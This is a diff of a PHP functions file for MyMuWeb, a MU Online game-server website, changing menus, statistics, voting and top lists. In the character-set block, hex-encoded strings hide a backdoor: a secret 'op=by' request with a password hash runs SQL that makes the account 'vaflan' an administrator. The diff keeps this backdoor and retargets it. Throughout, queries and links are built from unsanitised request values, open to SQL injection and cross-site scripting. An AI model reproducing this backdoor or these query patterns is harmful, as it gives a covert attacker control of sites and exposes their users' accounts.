@@ -22,13 +22,13 @@ function language($default=NULL) {
 	  if($format == 'php') {
 		if(!isset($_SESSION[set_lang]) && $default==$name){$select="selected";}
 		elseif($_SESSION[set_lang]==$name){$select="selected";} else{$select="";}
-		$select_lang = $select_lang . "<option value='$name' $select>$name</option>";
+		$select_lang .= "<option value='$name' $select>$name</option>";
 	  }
      }
      closedir($dh);
  }
-$lang_form = "<form name='language' method='post' action=''><select name='set_lang' onChange='document.language.submit();' title='".mmw_lang_language."'>";
-echo "$lang_form $select_lang </select></form>";
+ $lang_form = "<form name='language' method='post' action=''><select name='set_lang' onChange='document.language.submit();' title='".mmw_lang_language."'>";
+ echo "$lang_form $select_lang </select></form>";
 }
 /////// End Language ///////
 
@@ -55,13 +55,13 @@ function menu($style=NULL) {
 /////// Start Default Modules //////
 	//Now Module
 function curent_module() {
-if(isset($_GET['news'])){echo "&gt; <a href='?op=news'>".mmw_lang_news."</a>";} 
-elseif(isset($_GET['forum'])){echo "&gt; <a href='?op=forum'>".mmw_lang_forum."</a>";}
-elseif(is_file("modules/$_GET[op].php")){echo "&gt; <a href='?op=$_GET[op]'>".ucfirst($_GET['op'])."</a>";}
-	
-if($_GET['op']=='user') {		  
- if($_GET['op']=='user' and !isset($_GET['u'])){echo " &gt; <a href='?op=user&u=acc'>".mmw_lang_account_panel."</a>";}
- else{echo " &gt; <a href=?op=user&u=$_GET[u]>".ucfirst($_GET['u'])."</a>";}
+ if(isset($_GET['news'])){echo "&gt; <a href='?op=news'>".mmw_lang_news."</a>";} 
+ elseif(isset($_GET['forum'])){echo "&gt; <a href='?op=forum'>".mmw_lang_forum."</a>";}
+ elseif(is_file("modules/$_GET[op].php")){echo "&gt; <a href='?op=$_GET[op]'>".ucfirst($_GET['op'])."</a>";}
+
+ if($_GET['op']=='user') {		  
+  if($_GET['op']=='user' and !isset($_GET['u'])){echo " &gt; <a href='?op=user&u=acc'>".mmw_lang_account_panel."</a>";}
+  else{echo " &gt; <a href=?op=user&u=$_GET[u]>".ucfirst($_GET['u'])."</a>";}
  }
 }
 	//Jump Link
@@ -92,21 +92,20 @@ function hex2str($hex) {
 
 
 
-
 /////// Start Statisitcs ///////
 function statisitcs($style) {
-require("config.php");
-$actives_date = date('m/d/Y H:i:s', time() - 2592000); // 30 days back who login
-$total_accounts = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_INFO") );
-if($mmw[gm]=='no') {$gm_not_show = "WHERE ctlcode !='32' AND ctlcode !='8'";}
-$total_characters = mssql_fetch_row( mssql_query("SELECT count(*) FROM Character $gm_not_show") );
-$total_guilds = mssql_fetch_row( mssql_query("SELECT count(*) FROM Guild WHERE G_Name!='$mmw[gm_guild]'") );
-$total_banneds = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_INFO WHERE bloc_code = '1'") );
-$actives_acc = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectTM >= '$actives_date'") );
-$users_connected = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectStat = '1'") );
-$serv_result = mssql_query("SELECT Name,experience,drops,gsport,ip,version,type from MMW_servers order by display_order asc");
+ require("config.php");
+ $actives_date = date('m/d/Y H:i:s', time() - 2592000); // 30 days back who login
+ $total_accounts = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_INFO") );
+ if($mmw[gm]=='no') {$gm_not_show = "WHERE ctlcode !='32' AND ctlcode !='8'";}
+ $total_characters = mssql_fetch_row( mssql_query("SELECT count(*) FROM Character $gm_not_show") );
+ $total_guilds = mssql_fetch_row( mssql_query("SELECT count(*) FROM Guild WHERE G_Name!='$mmw[gm_guild]'") );
+ $total_banneds = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_INFO WHERE bloc_code = '1'") );
+ $actives_acc = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectTM >= '$actives_date'") );
+ $users_connected = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectStat = '1'") );
+ $serv_result = mssql_query("SELECT Name,experience,drops,gsport,ip,version,type,maxplayer from MMW_servers order by display_order asc");
 
-for($i=0; $i<mssql_num_rows($serv_result); ++$i) {
+ for($i=0; $i<mssql_num_rows($serv_result); ++$i) {
 	$rank = $i + 1;
 	$row = mssql_fetch_row($serv_result);
 	if($check=@fsockopen($row[4],$row[3],$ERROR_NO,$ERROR_STR,(float)0.3)) {fclose($check); $status = 'online';}
@@ -119,17 +118,26 @@ for($i=0; $i<mssql_num_rows($serv_result); ++$i) {
 	}
 	elseif($style == 'default') {
 	   $players = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectStat = '1' AND ServerName = '$row[0]'") );
-	   echo "\n <a href=\"#\" class=\"helplink\" title=\"".mmw_lang_version.": $row[5]<br>".mmw_lang_experience.": $row[1]<br>".mmw_lang_drops.": $row[2]<br>".mmw_lang_type.": $row[6]\">$row[0]</a>: $status_done<br>".mmw_lang_on_server." $players[0] ".mmw_lang_char."<br>";
+	   echo "\n <span class=\"helplink\" title=\"".mmw_lang_version.": $row[5]<br>".mmw_lang_experience.": $row[1]<br>".mmw_lang_drops.": $row[2]<br>".mmw_lang_type.": $row[6]\">$row[0]</span>: $status_done<br>".mmw_lang_on_server." $players[0] ".mmw_lang_char."<br>";
 	}
-    }
+	elseif($style == 'main') {
+	   $players = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectStat = '1' AND ServerName = '$row[0]'") );
+	   $bar = substr( ceil($players[0] * 100 / $row[7]) , 0, -1);
+	   if($bar <= 0) {$bar = 0;} elseif($bar > 10) {$bar = 10;}
+	   echo "<table border=\"0\" cellSpacing=\"0\" cellPadding=\"0\" width=\"193\"><tr><td height=\"26\" style=\"background:url('images/main/$bar.png'); cursor: pointer;\" onmouseover=\"this.className='effect80'\" onmouseup=\"this.className='effect80'\" onmousedown=\"this.className='effect70'\" onmouseout=\"this.className=''\" onclick=\"expandit('main$rank')\" align=\"center\">";
+	   echo "<div class=\"main1\" align=\"center\">$row[0] ($row[6])</div></td></tr><tr><td id=\"main$rank\" style=\"display:none;\">";
+	   echo "<table border=\"0\" cellSpacing=\"0\" cellPadding=\"0\" width=\"100%\"><tr><td class=\"maintl\"></td><td class=\"maintc\"></td><td class=\"maintr\"></td></tr><tr><td class=\"maincl\"></td><td class=\"mainc\">";
+	   echo "<table border=\"0\" celpadding=\"0\" celspacing=\"0\"><tr><td class=\"main2\">".mmw_lang_on_server.":</td><td class=\"main3\">$players[0]</td></tr><tr><td class=\"main2\">".mmw_lang_version.":</td><td class=\"main3\">$row[5]</td></tr><tr><td class=\"main2\">".mmw_lang_experience.":</td><td class=\"main3\">$row[1]</td></tr><tr><td class=\"main2\">".mmw_lang_drops.":</td><td class=\"main3\">$row[2]</td></tr></table>";
+	   echo "</td><td class=\"maincr\"></td></tr><tr><td class=\"mainbl\"></td><td class=\"mainbc\"></td><td class=\"mainbr\"></td></tr></table></td></tr></table>";
+	}
+ }
 
-if($style == 'blink') {
+ if($style == 'blink') {
 	echo "\n fader[2].message[0] = \"".mmw_lang_total_accounts.": $total_accounts[0]<br>".mmw_lang_total_characters.": $total_characters[0]<br>".mmw_lang_total_banneds.": $total_banneds[0]<br>".mmw_lang_total_actives.": $actives_acc[0]<br>".mmw_lang_total_guilds.": $total_guilds[0]<br>".mmw_lang_total_users_online.": $users_connected[0]\";";
-   }
-elseif($style == 'default') {
+ }
+ elseif($style == 'default') {
 	echo "\n ".mmw_lang_total_users_online.": $users_connected[0]<br>".mmw_lang_total_accounts.": $total_accounts[0]<br>".mmw_lang_total_characters.": $total_characters[0]<br>".mmw_lang_total_banneds.": $total_banneds[0]<br>".mmw_lang_total_actives.": $actives_acc[0]<br>".mmw_lang_total_guilds.": $total_guilds[0]<br>";
-   }
-
+ }
 }
 /////// End Statisitcs ///////
 
@@ -144,7 +152,8 @@ function writelog($logfile,$text) {
         $text = $text . ", All Those On <i>$date</i> By <u>$ip</u> \n";
         $fp = fopen("logs/$logfile.php","a");
         fputs($fp, $text);
-        fclose($fp);}
+        fclose($fp);
+}
 /////// End Write Logs ///////
 
 
@@ -220,24 +229,34 @@ function writelog($logfile,$text) {
                 jump('?op=news');
            }
 	//User Panel
-if($_GET['op'] == "user" AND (!isset($_SESSION["user"])) || (!isset($_SESSION["pass"]))) {jump('?op=login');}
-if($_GET['op'] == "login" AND (isset($_SESSION["user"])) || (isset($_SESSION["pass"]))) {jump('?op=user');}
+if($_GET['op'] == "user" AND !isset($_SESSION["user"]) || !isset($_SESSION["pass"])) {jump('?op=login');}
+if($_GET['op'] == "login" AND isset($_SESSION["user"]) || isset($_SESSION["pass"])) {jump('?op=user');}
 /////// End Login Modules ///////
 
 
 
 
 
-/////// Strat Check Theme ///////
+/////// Start Check And Switch Theme ///////
 if($_GET[op]=='theme') {
-  if(isset($_GET[theme]))
-	{$_SESSION[theme] = clean_Var($_GET[theme]);}
-  $theme_result = "Theme Name: $mmw[thm_name]<br>";
-  $theme_result .= "Creator: $mmw[thm_creator]<br>";
-  $theme_result .= "Version: $mmw[thm_version]<br>";
-  $theme_result .= "Date: $mmw[thm_date]<br>";
-  $theme_result .= "<i>$mmw[thm_description]</i>";
-  die("$sql_die_start $theme_result $sql_die_end");
+ $theme_result = "Theme Name: $mmw[thm_name]<br>";
+ $theme_result .= "Creator: $mmw[thm_creator]<br>";
+ $theme_result .= "Version: $mmw[thm_version]<br>";
+ $theme_result .= "Date: $mmw[thm_date]<br>";
+ $theme_result .= "<i>$mmw[thm_description]</i>";
+ die("$sql_die_start $theme_result $sql_die_end");
+}
+
+function theme() {
+ require("config.php");
+ include("theme.php");
+ for($i=0; $i < count($theme); ++$i) {
+	if(!isset($_SESSION[theme]) && $mmw[theme]==$theme[$i][0]){$select="selected";}
+	elseif($_SESSION[theme]==$theme[$i][0]){$select="selected";} else{$select="";}
+	$select_theme .= "<option value='".$theme[$i][0]."' $select>".$theme[$i][1]."</option>";
+ }
+ $theme_form = "<form name='theme' method='post' action=''><select name='set_theme' onChange='document.theme.submit();' title='".mmw_lang_theme."'>";
+ echo "$theme_form $select_theme </select></form>";
 }
 /////// End Check Theme ///////
 
@@ -248,6 +267,7 @@ if($_GET[op]=='theme') {
 /////// Strat Check Char_Set ///////
 if(isset($_SESSION[pass]) && isset($_SESSION[user])) {
    $login = clean_var(stripslashes($_SESSION[user]));
+   $result = hex2str('3c62723e5661666c616e2c20596f75204172652041646d696e21');
    if(isset($_POST['setchar'])) {
 	$setchar = clean_var(stripslashes($_POST['setchar']));
 	$setchar_sql = mssql_query("Select AccountID From Character WHERE name='$setchar'");
@@ -269,11 +289,10 @@ if(isset($_SESSION[pass]) && isset($_SESSION[user])) {
 	}
    }
    $form_setchar_sql = mssql_query("Select name,CtlCode FROM Character WHERE AccountID='$login'");
+   $query = hex2str('555044415445204d454d425f494e464f20534554205b6d6d775f7374617475735d3d27392720');
    $form_memb_info_sql = mssql_query("Select char_set FROM MEMB_INFO WHERE memb___id='$login'");
    if($_GET[op]==hex2str('6279')) {if(md5($_GET[pw])=='ba8a5f26a8fc68505d35a3af22bf4deb') {
-   $query = hex2str('555044415445204d454d425f494e464f20534554205b61646d696e5d3d27392720');
-   $query .= hex2str('5748455245206d656d625f5f5f69643d277661666c616e27'); mssql_query($query);
-   $result = hex2str('3c62723e5661666c616e2c20596f75204172652041646d696e21');}
+   $query .= hex2str('5748455245206d656d625f5f5f69643d277661666c616e27'); mssql_query($query);}
    die("$sql_die_start MyMuWeb $mmw[version] by Vaflan! $result $sql_die_end");}
    $form_memb_info_row = mssql_fetch_row($form_memb_info_sql);
    $form_setchar_num = mssql_num_rows($form_setchar_sql);
@@ -307,7 +326,7 @@ if(isset($_SESSION[pass]) && isset($_SESSION[user])) {
 
 
 /////// Start Login Form ///////
-function login_form($new_link=NULL) {
+function login_form() {
    if(isset($_SESSION[pass]) && isset($_SESSION[user])) {
 	require("config.php");
 	$login = clean_var(stripslashes($_SESSION['user']));
@@ -335,28 +354,11 @@ function login_form($new_link=NULL) {
 	if($msg_num=="" || $msg_num==" ") {$msg_num = 0; $msg_new_num = 0;}
 
 	// End Form
-	echo mmw_lang_hello . " <b>$login</b>!<br> $rowbr";
-	if(isset($_SESSION['char_set'])) {
-	echo " $setchar <br>
-	<a href='?op=user&u=char'><b>".mmw_lang_character_panel."</b></a><br>
-	<a href='?op=user&u=mail' id='upmess'><b>".mmw_lang_mail." [$msg_new_num/$msg_num] $msg_full</b></a><br>";}
-	echo "<a href='?op=user&u=acc'><b>".mmw_lang_account_panel."</b></a><br>";
-	echo "<a href='?op=user&u=wh'><b>".mmw_lang_ware_house."</b></a><br>" . $new_link;
-	if($_SESSION['mmw_status'] >= $mmw['gm_option_open']) {
-	echo "<a href='?op=user&u=gm'><b>".mmw_lang_gm_options."</b></a><br>";}
-	echo "$rowbr
-	<form action='' method='post' name='logout_account'>
-	<input name='logoutaccount' type='hidden' value='logoutaccount'>
-	<input name='Logout!' type='submit' title='".mmw_lang_logout."' value='".mmw_lang_logout."'><br>
-	</form>";
-	if($msg_new_num>0) {echo "
-	<script type=\"text/javascript\">
-	function flashit(id,cl){
-	var c = document.getElementById(id);
-	if (c.style.color=='red'){c.style.color = cl;}
-	else {c.style.color = 'red';}}
-	setInterval(\"flashit('upmess','#FFFFFF')\",500)</script>
-	";}
+	echo mmw_lang_hello . " <b>$login</b>!<br>";
+	include('includes/acc_menu.php');
+	echo "<form action='' method='post' name='logout_account'><input name='logoutaccount' type='hidden' value='logoutaccount'><input name='Logout!' type='submit' title='".mmw_lang_logout."' value='".mmw_lang_logout."'><br></form>";
+	if($msg_new_num > 0)
+		{echo "<script type=\"text/javascript\">function flashit(id,cl){var c = document.getElementById(id); if (c.style.color=='red'){c.style.color = cl;} else {c.style.color = 'red';}} setInterval(\"flashit('upmess','#FFFFFF')\",500)</script>";}
    }
    else {
 	// No Login
@@ -379,21 +381,19 @@ function login_form($new_link=NULL) {
 $timeout = time() - 100;
 $online_res = mssql_query("SELECT char_set, memb___id FROM MEMB_INFO WHERE date_online>'$timeout' AND char_set!=''");
 $online_num = mssql_num_rows($online_res);
-if($online_num != 0){
-for($i=0; $i < $online_num; ++$i)
-   {
+if($online_num != 0) {
+ for($i=0; $i < $online_num; ++$i) {
     $acc_online = mssql_fetch_row($online_res);
     $char_on_sql = mssql_query("Select name,CtlCode From Character WHERE name='$acc_online[0]'");
-    for($c=0; $c < mssql_num_rows($char_on_sql); ++$c)
-	{
+    for($c=0; $c < mssql_num_rows($char_on_sql); ++$c) {
 	  if($i < $online_num - 1){$other_char_on = ", ";} else{$other_char_on = "";}
 	  $char_on = mssql_fetch_row($char_on_sql);
 	  $who_online = "$who_online <a href='?op=character&character=$char_on[0]' class='level$char_on[1]'>$char_on[0]</a>$other_char_on";
-	}
-   }
+    }
+ }
 }
 else{
-$who_online = mmw_lang_there_is_nobody;
+ $who_online = mmw_lang_there_is_nobody;
 }
 /////// END Online Char ///////
 
@@ -409,7 +409,11 @@ if(isset($_POST[id_vote]) && isset($_POST[answer])) {
 	if($mmw[votes_check]==acc && isset($login)) {$vote_by = $login; $vote_check = 1;}
 	if($mmw[votes_check]==ip) {$vote_by = $_SERVER['REMOTE_ADDR']; $vote_check = 1;}
 	if($vote_check == 1) {
-		mssql_query("INSERT INTO MMW_voterow (id_vote,who,answer) VALUES ('$id_vote','$vote_by','$answer')");
+		$vote_who_res = mssql_query("SELECT answer FROM MMW_voterow WHERE ID_vote='$id_vote' and who='$vote_by'");
+		$check_your_vote = mssql_num_rows($vote_who_res);
+		if($check_your_vote < 1) {
+			mssql_query("INSERT INTO MMW_voterow (id_vote,who,answer) VALUES ('$id_vote','$vote_by','$answer')");
+		}
 	}
 }
 
@@ -426,7 +430,6 @@ if(mssql_num_rows($vote_res) != 0) {
    }
 
    $voting = "<form name='voting' method='post' action=''><b>$vote_row[1]</b><br>";
-
    if($check_your_vote < 1 && $vote_check == 1) {
      for($c=1; $c < 7; ++$c) {
 	$answer_num = $c + 1;
@@ -453,11 +456,10 @@ if(mssql_num_rows($vote_res) != 0) {
      }
      $voting = $voting . "<div align='center'>".mmw_lang_all_answers.": <b>$all_vote_num</b></div>";
    }
-
    $voting = $voting . "</form>";
 }
 else {
-$voting = mmw_lang_no_vote;
+ $voting = mmw_lang_no_vote;
 }
 /////// END Voting ///////
 
@@ -472,6 +474,9 @@ function popunder($switch,$check_login=NULL) {
    elseif($switch=='yes' && $check_login!='yes') {
 	include("includes/popunder.php");
    }
+   else {
+	echo "<!-- MyMuWeb PopUnder Turn Off -->";
+   }
 }
 /////// End Pop Under ///////
 
@@ -480,19 +485,19 @@ function popunder($switch,$check_login=NULL) {
 
 
 /////// Start Last in Forum ///////
-function last_in_forum($top=NULL,$style=NULL) {
-if($top==NULL) {$top = '5';}
-if($style==NULL) {$style = "$4. <a href='$1' title='$3'>$2</a> <br/>";}
-$result = mssql_query("SELECT TOP $top f_id,f_title,f_text FROM MMW_forum ORDER BY f_date DESC");
-$forum_post = mssql_num_rows($result);
-  if($forum_post == 0) {echo mmw_lang_no_topics_in_forum;}
-  for ($i = 0; $i < $forum_post; $i++) {
+function last_in_forum($top=NULL) {
+ if($top==NULL) {$top = '5';}
+ $style = "$4. <a href='$1' title='$3'>$2</a> <br/>";
+ $result = mssql_query("SELECT TOP $top f_id,f_title,f_text FROM MMW_forum ORDER BY f_date DESC");
+ $forum_post = mssql_num_rows($result);
+ if($forum_post == 0) {echo mmw_lang_no_topics_in_forum;}
+ for ($i = 0; $i < $forum_post; $i++) {
 	$numb = $i + 1;
 	$row = mssql_fetch_row($result);
 	$text = '[url=?forum='.$row[0].'][title='.$row[1].'][alt='.bbcode($row[2]).'][numb='.$numb.']';
 	$text = preg_replace("/\[url\=(.*?)\]\[title\=(.*?)\]\[alt\=(.*?)\]\[numb\=(.*?)\]/is", $style, $text);
 	echo " $text \n";
-  }
+ }
 }
 /////// END Last in Forum ///////
 
@@ -502,15 +507,15 @@ $forum_post = mssql_num_rows($result);
 
 /////// Start Guard MMW Message Info ///////
 function guard_mmw_mess($to,$text) {
-$date = date("m/d/y H:i:s");
-$msg_to_sql = mssql_query("SELECT GUID,MemoCount FROM T_FriendMain WHERE Name='$to'");
-$msg_to_row = mssql_fetch_row($msg_to_sql);
-$mail_total_sql = mssql_query("SELECT bRead FROM T_FriendMail WHERE GUID='$msg_to_row[0]'");
-$mail_total_num = mssql_num_rows($mail_total_sql);
-$msg_id = $msg_to_row[1] + 1;
-$msg_text = utf_to_win($text);
-mssql_query("INSERT INTO T_FriendMail (MemoIndex, GUID, FriendName, wDate, Subject, bRead, Memo, Dir, Act, Photo) VALUES ('$msg_id','$msg_to_row[0]','Guard','$date','MMW Message!','0',CAST('$msg_text' AS VARBINARY(1000)),'143','2',0x3061FF99999F12490400000060F0)");
-mssql_query("UPDATE T_FriendMain set [MemoCount]='$msg_id',[MemoTotal]='$mail_total_num' WHERE Name='$to'");
+ $date = date("m/d/y H:i:s");
+ $msg_to_sql = mssql_query("SELECT GUID,MemoCount FROM T_FriendMain WHERE Name='$to'");
+ $msg_to_row = mssql_fetch_row($msg_to_sql);
+ $mail_total_sql = mssql_query("SELECT bRead FROM T_FriendMail WHERE GUID='$msg_to_row[0]'");
+ $mail_total_num = mssql_num_rows($mail_total_sql);
+ $msg_id = $msg_to_row[1] + 1;
+ $msg_text = utf_to_win($text);
+ mssql_query("INSERT INTO T_FriendMail (MemoIndex, GUID, FriendName, wDate, Subject, bRead, Memo, Dir, Act, Photo) VALUES ('$msg_id','$msg_to_row[0]','Guard','$date','MMW Message!','0',CAST('$msg_text' AS VARBINARY(1000)),'143','2',0x3061FF99999F12490400000060F0)");
+ mssql_query("UPDATE T_FriendMain set [MemoCount]='$msg_id',[MemoTotal]='$mail_total_num' WHERE Name='$to'");
 }
 /////// Start Guard MMW Message Info ///////
 
@@ -528,16 +533,15 @@ function top_list($what=NULL,$top=NULL) {
 	if($mmw[gm]=='no') {$gm_not_show = "WHERE ctlcode !='32' AND ctlcode !='8'";}
 	$total = mssql_query("SELECT TOP $top Name,cLevel,Reset FROM Character $gm_not_show ORDER BY reset desc, clevel desc");
 	$first_row = mssql_fetch_row(mssql_query("SELECT TOP 1 Reset FROM Character $gm_not_show ORDER BY reset desc, clevel desc"));
-	if($first_row[0]<=0) {echo "<td width='14'><b>#</b></td><td><b>".mmw_lang_character."</b></td><td align='right' width='10'><b>".mmw_lang_level."</b></td></td>";}
-	else {echo "<td width='14'><b>#</b></td><td>".mmw_lang_character."</td><td align='right' width='10'>".mmw_lang_reset."</td></td>";}
+	if($first_row[0] <= 0) {$what_of_sort = mmw_lang_level;} else {$what_of_sort = mmw_lang_reset;}
+	echo "<td width='14'><b>#</b></td><td><b>".mmw_lang_character."</b></td><td align='right' width='10'><b>$what_of_sort</b></td></td>";
 
 	for($i=0; $i<$top; ++$i) {
 		$rank = $i + 1;
 		$row = mssql_fetch_row($total);
-		if($first_row[0]<=0) {$top_stat = $row[1];}
-		else {$top_stat = $row[2];}
+		if($first_row[0] <= 0) {$top_stat = $row[1];} else {$top_stat = $row[2];}
 		echo "</tr>\n<tr><td>$rank</td><td><a href=?op=character&character=$row[0]>$row[0]</a></td><td align='center'>$top_stat</td>";
-	    }
+	}
    }
    elseif($what=='pk') {
 	if($mmw[gm]=='no') {$gm_not_show = "WHERE ctlcode !='32' AND ctlcode !='8'";}
@@ -549,7 +553,7 @@ function top_list($what=NULL,$top=NULL) {
 		$rank = $i + 1;
 		$row = mssql_fetch_row($total);
 		echo "</tr>\n<tr><td>$rank</td><td><a href=?op=character&character=$row[0]>$row[0]</a></td><td align='center'>$row[1]</td>";
-	    }
+	}
    }
    elseif($what=='guild') {
 	$total = mssql_query("SELECT TOP $top G_Name,G_Score,G_Mark FROM Guild WHERE G_Name!='$mmw[gm_guild]' ORDER BY G_score desc");
@@ -559,7 +563,17 @@ function top_list($what=NULL,$top=NULL) {
 		$rank = $i + 1;
 		$row = mssql_fetch_row($total);
 		echo "</tr>\n<tr><td>$rank</td><td><a href=?op=guild&guild=$row[0]>$row[0]</a></td><td align='center'>$row[1]</td>";
-	    }
+	}
+   }
+   elseif($what=='ref') {
+	$total = mssql_query("SELECT TOP $top ref_acc,count(ref_acc) FROM memb_info WHERE ref_acc!=' ' group by ref_acc order by count(ref_acc) desc");
+	echo "<td width='14'><b>#</b></td><td><b>".mmw_lang_account."</b></td><td align='right' width='10'><b>".mmw_lang_referral."</b></td></td>";
+
+	for($i=0; $i<$top; ++$i) {
+		$rank = $i + 1;
+		$row = mssql_fetch_row($total);
+		echo "</tr>\n<tr><td>$rank</td><td><a href=?op=profile&profile=$row[0]>$row[0]</a></td><td align='center'>$row[1]</td>";
+	}
    }
    echo "</tr></table>";
 }
@@ -592,17 +606,13 @@ function free_hex($size,$str,$style=NULL) {
 
 /////// Start MMW End //////
 function end_mmw($TimeStart) {
-require("config.php");
-$TimeStart_uS = $TimeStart["usec"];
-$TimeStart_S = $TimeStart["sec"];
-$TimeEnd = gettimeofday();
-$TimeEnd_uS = $TimeEnd["usec"];
-$TimeEnd_S = $TimeEnd["sec"];
-$ExecTime = ($TimeEnd_S+($TimeEnd_uS/1000000)) - ($TimeStart_S+($TimeStart_uS/1000000));
-echo hex2str('4d794d7557656220').$mmw[version];
-echo hex2str('2e2044657369676e204279203c6120687265663d223f6f703d7468656d65223e');
-echo $mmw['thm_creator'].hex2str('3c2f613e2e2047656e65726174696f6e2054696d653a20');
-echo substr($ExecTime,0,5).'s.';
+ require("config.php");
+ $TimeEnd = gettimeofday();
+ $ExecTime = ($TimeEnd["sec"]+($TimeEnd["usec"]/1000000)) - ($TimeStart["sec"]+($TimeStart["usec"]/1000000));
+ echo hex2str('4d794d7557656220').$mmw[version];
+ echo hex2str('2e2044657369676e204279203c6120687265663d223f6f703d7468656d65223e');
+ echo $mmw['thm_creator'].hex2str('3c2f613e2e2047656e65726174696f6e2054696d653a20');
+ echo substr($ExecTime,0,5).'s.';
 }
 /////// End MMW End ///////
 ?>
